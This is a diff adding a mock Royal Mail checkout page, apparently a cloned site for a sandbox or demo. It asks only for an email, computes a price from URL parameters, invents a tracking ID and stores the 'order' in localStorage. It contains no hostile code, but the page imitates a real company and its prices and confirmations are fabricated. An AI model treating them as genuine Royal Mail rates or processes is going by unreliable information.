@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Payment │ Royal Mail Group Ltd</title>
+  <link rel="icon" href="/themes/custom/rmlcwr/favicon.ico" type="image/vnd.microsoft.icon" />
+  <link rel="stylesheet" media="all" href="/sites/royalmail.com/files/css/css_ODYokhBbKR7FlzA-7fl3l0uJBWiju94YNrYAHDY3YpI.css" />
+  <link rel="stylesheet" media="all" href="/sites/royalmail.com/files/css/css_yFhZGdjC--Km12j2-CDLPm_g-JrdWr0ZfXXqyN1-cXk.css" />
+  <script>
+    window.__RM_TRUSTARC__ = location.hostname === "royalmail.com" || location.hostname.endsWith(".royalmail.com");
+  </script>
+  <style>
+    :root { --rm-red:#e4002b; --rm-ink:#2b2b2f; --rm-border:rgba(0,0,0,.12); --rm-surface:#fff; --rm-surface-2:#f6f6f7; --rm-good:#0a7a34; --rm-bad:#b70e13; }
+    #rm-page-loader{position:fixed;inset:0;background:var(--rm-surface);z-index:2147483647;display:flex;align-items:center;justify-content:center;opacity:1;visibility:visible;transition:opacity 220ms ease,visibility 220ms ease}
+    #rm-page-loader.rm-hidden{opacity:0;visibility:hidden;pointer-events:none}
+    .rm-loader-inner{display:grid;place-items:center;gap:14px}
+    .rm-loader-logo{width:78px;height:auto}
+    .rm-loader-ring{width:34px;height:34px;border-radius:999px;border:3px solid rgba(228,0,43,.18);border-top-color:var(--rm-red);animation:rm-spin 700ms linear infinite}
+    @keyframes rm-spin{to{transform:rotate(360deg)}}
+    @media (prefers-reduced-motion: reduce){#rm-page-loader{transition:none}.rm-loader-ring{animation:none}}
+    body{background:var(--rm-surface-2);color:var(--rm-ink)}
+    .rm-shell{min-height:100vh;display:grid;grid-template-rows:auto 1fr}
+    .rm-header{background:var(--rm-surface);border-bottom:1px solid var(--rm-border)}
+    .rm-header-inner{max-width:1100px;margin:0 auto;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:16px}
+    .rm-brand{display:inline-flex;align-items:center;gap:12px;text-decoration:none;color:inherit}
+    .rm-brand img{width:48px;height:auto;display:block}
+    .rm-brand-title{font-size:16px;line-height:1.2;font-weight:700;margin:0}
+    .rm-link{color:var(--rm-red);text-decoration:none;font-weight:700;font-size:13px}
+    .rm-link:hover{text-decoration:underline}
+    .rm-main{max-width:1100px;width:100%;margin:0 auto;padding:24px 16px 40px;display:grid;gap:14px}
+    .rm-grid{display:grid;grid-template-columns:1fr;gap:12px}
+    @media (min-width:900px){.rm-grid{grid-template-columns:1.1fr .9fr}}
+    .rm-card{background:var(--rm-surface);border:1px solid var(--rm-border);border-radius:16px;box-shadow:0 18px 40px rgba(0,0,0,.08);padding:18px}
+    .rm-card h1{margin:0 0 10px;font-size:22px;line-height:1.2}
+    .rm-section-title{margin:0 0 10px;font-size:18px;line-height:1.2}
+    .rm-muted{color:rgba(43,43,47,.78);font-size:13px;margin:0;line-height:1.6}
+    .rm-form{display:grid;gap:10px}
+    .rm-field{display:grid;gap:6px}
+    .rm-label{font-size:12px;font-weight:900;color:rgba(43,43,47,.72);text-transform:uppercase;letter-spacing:.04em}
+    .rm-input{border:1px solid var(--rm-border);border-radius:12px;padding:10px 12px;font-size:14px;outline:none;background:#fff}
+    .rm-input:focus{border-color:rgba(228,0,43,.45);box-shadow:0 0 0 4px rgba(228,0,43,.08)}
+    .rm-row{display:grid;grid-template-columns:1fr;gap:10px}
+    @media (min-width:640px){.rm-row{grid-template-columns:1fr 1fr}}
+    .rm-actions{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+    .rm-btn{border:0;border-radius:12px;background:var(--rm-red);color:#fff;padding:10px 12px;font-weight:800;font-size:13px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:8px}
+    .rm-btn.secondary{background:#fff;border:1px solid var(--rm-border);color:var(--rm-ink)}
+    .rm-summary-list{display:grid;gap:8px}
+    .rm-summary-row{display:flex;align-items:center;justify-content:space-between;gap:10px;font-size:13px}
+    .rm-divider{height:1px;background:var(--rm-border);margin:4px 0}
+    .rm-total{font-size:18px;font-weight:900}
+    .rm-note{border:1px solid rgba(0,0,0,.08);border-radius:12px;padding:10px 12px;background:#fff}
+    .rm-banner{border-radius:12px;padding:10px 12px;font-size:13px}
+    .rm-banner.good{border:1px solid rgba(10,122,52,.25);background:rgba(10,122,52,.08);color:var(--rm-good)}
+    .rm-banner.bad{border:1px solid rgba(183,14,19,.25);background:rgba(183,14,19,.08);color:var(--rm-bad)}
+    #rm-cookie-banner{position:fixed;left:16px;right:16px;bottom:16px;z-index:2147483646;background:#fff;border:1px solid var(--rm-border);border-radius:16px;box-shadow:0 18px 40px rgba(0,0,0,.12);padding:14px 14px 12px;display:none}
+    #rm-cookie-banner.rm-show{display:block}
+    .rm-cookie-title{font-size:14px;font-weight:800;margin:0 0 6px}
+    .rm-cookie-text{font-size:13px;color:rgba(43,43,47,.82);margin:0 0 12px;line-height:1.45}
+    .rm-cookie-actions{display:flex;gap:10px;flex-wrap:wrap;align-items:center;justify-content:flex-end}
+    .rm-cookie-btn{border:0;border-radius:12px;padding:10px 12px;font-weight:800;font-size:13px;cursor:pointer}
+    .rm-cookie-btn.primary{background:var(--rm-red);color:#fff}
+    .rm-cookie-btn.secondary{background:#fff;border:1px solid var(--rm-border);color:var(--rm-ink)}
+  </style>
+</head>
+<body>
+  <div id="rm-page-loader" role="status" aria-live="polite" aria-label="Loading">
+    <div class="rm-loader-inner">
+      <img class="rm-loader-logo" src="/themes/custom/rmlcwr/rmg_logo.svg" alt="Royal Mail" />
+      <div class="rm-loader-ring" aria-hidden="true"></div>
+    </div>
+  </div>
+  <div id="rm-cookie-banner" role="dialog" aria-live="polite" aria-label="Cookies">
+    <p class="rm-cookie-title">Cookies on this site</p>
+    <p class="rm-cookie-text">We use cookies to make this site work and to improve your experience. You can accept all cookies or reject non-essential cookies.</p>
+    <div class="rm-cookie-actions">
+      <a class="rm-link" href="../cookies-policy/" style="margin-right:auto">Cookies policy</a>
+      <button class="rm-cookie-btn secondary" type="button" id="rm-cookie-reject">Reject non‑essential</button>
+      <button class="rm-cookie-btn primary" type="button" id="rm-cookie-accept">Accept all</button>
+    </div>
+  </div>
+  <div class="rm-shell">
+    <header class="rm-header">
+      <div class="rm-header-inner">
+        <a class="rm-brand" href="../" aria-label="Royal Mail Home">
+          <img src="/themes/custom/rmlcwr/rmg_logo.svg" alt="Royal Mail" />
+          <p class="rm-brand-title">Royal Mail</p>
+        </a>
+        <div class="rm-actions">
+          <a class="rm-link" href="../send/">Send</a>
+          <a class="rm-link" href="../track-your-item">Track</a>
+          <a class="rm-link" href="../help/">Help</a>
+        </div>
+      </div>
+    </header>
+    <main class="rm-main">
+      <div class="rm-grid">
+        <div class="rm-card">
+          <h1>Checkout</h1>
+          <p class="rm-muted">Review your order and continue.</p>
+          <div id="rm-pay-error" class="rm-banner bad" style="display:none;margin-top:10px"></div>
+          <div id="rm-pay-success" class="rm-banner good" style="display:none;margin-top:10px"></div>
+          <form class="rm-form" id="rm-payment-form" style="margin-top:12px">
+            <div class="rm-field">
+              <div class="rm-label">Email</div>
+              <input class="rm-input" id="rm-email" inputmode="email" autocomplete="email" placeholder="you@example.com" />
+            </div>
+            <div class="rm-actions">
+              <button class="rm-btn" type="submit" id="rm-pay-now">Confirm order</button>
+              <a class="rm-btn secondary" id="rm-back-link" href="../send/">Back</a>
+            </div>
+          </form>
+        </div>
+        <div class="rm-card">
+          <h2 class="rm-section-title">Order summary</h2>
+          <div class="rm-summary-list">
+            <div class="rm-summary-row"><span>Destination</span><strong id="rm-summary-destination">-</strong></div>
+            <div class="rm-summary-row"><span>Service</span><strong id="rm-summary-service">-</strong></div>
+            <div class="rm-summary-row"><span>Weight</span><strong id="rm-summary-weight">-</strong></div>
+            <div class="rm-divider"></div>
+            <div class="rm-summary-row rm-total"><span>Total</span><span id="rm-summary-total">-</span></div>
+          </div>
+          <div class="rm-note" style="margin-top:12px">
+            <p class="rm-muted">After checkout, you are redirected to tracking with a new reference automatically.</p>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+  <script>
+    (function() {
+      var loader = document.getElementById("rm-page-loader");
+      if (!loader) return;
+      var hide = function() { loader.classList.add("rm-hidden"); };
+      window.addEventListener("pageshow", hide);
+      window.addEventListener("load", function() { setTimeout(hide, 120); });
+    })();
+  </script>
+  <script>
+    (function() {
+      if (window.__RM_TRUSTARC__) return;
+      var key = "rm_cookie_consent_v1";
+      var banner = document.getElementById("rm-cookie-banner");
+      var acceptBtn = document.getElementById("rm-cookie-accept");
+      var rejectBtn = document.getElementById("rm-cookie-reject");
+      if (!banner || !acceptBtn || !rejectBtn) return;
+      var read = function() { try { var raw = localStorage.getItem(key); return raw ? JSON.parse(raw) : null; } catch (_) { return null; } };
+      var write = function(choice) { try { localStorage.setItem(key, JSON.stringify({ choice: choice, ts: new Date().toISOString() })); } catch (_) {} };
+      var current = read();
+      var hasChoice = current && typeof current === "object" && (current.choice === "accepted" || current.choice === "rejected");
+      if (!hasChoice) banner.classList.add("rm-show");
+      acceptBtn.addEventListener("click", function() { write("accepted"); banner.classList.remove("rm-show"); });
+      rejectBtn.addEventListener("click", function() { write("rejected"); banner.classList.remove("rm-show"); });
+    })();
+  </script>
+  <script>
+    (function() {
+      var form = document.getElementById("rm-payment-form");
+      var payBtn = document.getElementById("rm-pay-now");
+      var err = document.getElementById("rm-pay-error");
+      var ok = document.getElementById("rm-pay-success");
+      var email = document.getElementById("rm-email");
+      var backLink = document.getElementById("rm-back-link");
+      var destinationOut = document.getElementById("rm-summary-destination");
+      var serviceOut = document.getElementById("rm-summary-service");
+      var weightOut = document.getElementById("rm-summary-weight");
+      var totalOut = document.getElementById("rm-summary-total");
+      if (!form || !payBtn || !err || !ok || !email || !backLink || !destinationOut || !serviceOut || !weightOut || !totalOut) return;
+
+      var money = new Intl.NumberFormat("en-GB", { style: "currency", currency: "GBP" });
+      var qs = new URLSearchParams(location.search || "");
+      var checkoutId = (qs.get("id") || "").trim();
+      var countryParam = (qs.get("country") || "").trim();
+      var formatParam = (qs.get("format") || "").trim();
+      var serviceParam = (qs.get("service") || "").trim();
+      var weightParam = (qs.get("weight") || "").trim();
+
+      var loadJson = function(key, fallback) {
+        try {
+          var raw = localStorage.getItem(key);
+          return raw ? JSON.parse(raw) : fallback;
+        } catch (_) {
+          return fallback;
+        }
+      };
+      var saveJson = function(key, value) {
+        try { localStorage.setItem(key, JSON.stringify(value)); } catch (_) {}
+      };
+      var uid = function() { return Math.random().toString(16).slice(2) + "-" + Date.now().toString(16); };
+      var nowIso = function() { return new Date().toISOString(); };
+      var newTrackingId = function() {
+        var p1 = Math.random().toString(36).slice(2, 8).toUpperCase();
+        var p2 = Date.now().toString(36).toUpperCase().slice(-6);
+        return "RM" + p1 + p2;
+      };
+
+      var clamp = function(n, min, max) { return Math.min(max, Math.max(min, n)); };
+      var baseFor = function(dest, weightKg) {
+        var w = clamp(weightKg, 0.05, 20);
+        if (dest === "intl") {
+          if (w <= 0.25) return 8.5;
+          if (w <= 0.5) return 11.0;
+          if (w <= 1) return 14.5;
+          if (w <= 2) return 19.5;
+          if (w <= 5) return 29.0;
+          return 39.0 + (w - 5) * 2.5;
+        }
+        if (w <= 0.1) return 0.91;
+        if (w <= 0.75) return 1.55;
+        if (w <= 2) return 3.65;
+        if (w <= 10) return 5.55 + (w - 2) * 0.55;
+        return 9.95 + (w - 10) * 0.75;
+      };
+      var multiplierFor = function(service) {
+        if (service === "tracked") return 1.35;
+        if (service === "express") return 1.75;
+        return 1;
+      };
+      var guessWeightForFormat = function(format) {
+        var f = (format || "").toLowerCase();
+        if (f === "letter") return 0.1;
+        if (f === "largeletter") return 0.5;
+        if (f === "smallparcel") return 2;
+        if (f === "mediumparcel") return 5;
+        if (f === "tube") return 5;
+        return 1;
+      };
+
+      var quote = null;
+      var checkout = loadJson("rm_checkout_v1", null);
+      if (checkout && checkout.quote && (!checkoutId || checkout.id === checkoutId)) {
+        quote = checkout.quote;
+        checkoutId = checkout.id || checkoutId;
+        if (checkout && checkout.source) backLink.href = checkout.source;
+      } else if (formatParam || countryParam) {
+        var country = (countryParam || "GBR").toUpperCase();
+        var dest = country && country !== "GBR" ? "intl" : "uk";
+        var service = (serviceParam || "standard").toLowerCase();
+        if (service !== "tracked" && service !== "express") service = "standard";
+        var wRaw = (weightParam || "").trim().replace(",", ".");
+        var wNum = Number(wRaw);
+        var weightKg = Number.isFinite(wNum) && wNum > 0 ? wNum : guessWeightForFormat(formatParam);
+        weightKg = clamp(weightKg, 0.05, 20);
+        var base = baseFor(dest, weightKg);
+        var price = Math.round(base * multiplierFor(service) * 100) / 100;
+        quote = { dest: dest, service: service, weightKg: weightKg, price: price, format: formatParam || "" };
+        backLink.href = "/send.royalmail.com/send/youritem?country=" + encodeURIComponent(country || "GBR") + "&format=" + encodeURIComponent(formatParam || "");
+        if (!checkoutId) checkoutId = uid();
+      }
+
+      if (!quote) {
+        err.style.display = "";
+        err.textContent = "No active checkout found. Please go back and start sending again.";
+        payBtn.disabled = true;
+        return;
+      }
+
+      var destinationLabel = quote.dest === "intl" ? "International" : "UK";
+      var serviceLabel = quote.service ? quote.service.charAt(0).toUpperCase() + quote.service.slice(1) : "Standard";
+      var weightLabel = String(quote.weightKg || "-") + "kg";
+      var total = Number(quote.price || 0);
+
+      destinationOut.textContent = destinationLabel;
+      serviceOut.textContent = serviceLabel;
+      weightOut.textContent = weightLabel;
+      totalOut.textContent = money.format(total);
+      payBtn.textContent = "Confirm order " + money.format(total);
+
+      form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        err.style.display = "none";
+        ok.style.display = "none";
+
+        var emailVal = (email.value || "").trim();
+
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal)) {
+          err.style.display = "";
+          err.textContent = "Please enter a valid email address.";
+          return;
+        }
+
+        payBtn.disabled = true;
+        payBtn.textContent = "Processing...";
+
+        var trackingId = newTrackingId();
+        var shipments = loadJson("rm_shipments_v1", []);
+        if (!Array.isArray(shipments)) shipments = [];
+        shipments.unshift({
+          id: uid(),
+          trackingId: trackingId,
+          createdAt: nowIso(),
+          status: "Confirmed",
+          from: "Drop-off",
+          to: quote.dest === "intl" ? "International destination" : "UK destination",
+          route: [],
+          updatedAt: nowIso()
+        });
+        saveJson("rm_shipments_v1", shipments);
+        localStorage.removeItem("rm_checkout_v1");
+
+        ok.style.display = "";
+        ok.textContent = "Order confirmed. Redirecting to tracking...";
+
+        setTimeout(function() {
+          window.location.href = "../track-your-item?ref=" + encodeURIComponent(trackingId);
+        }, 700);
+      });
+    })();
+  </script>
+</body>
+</html>
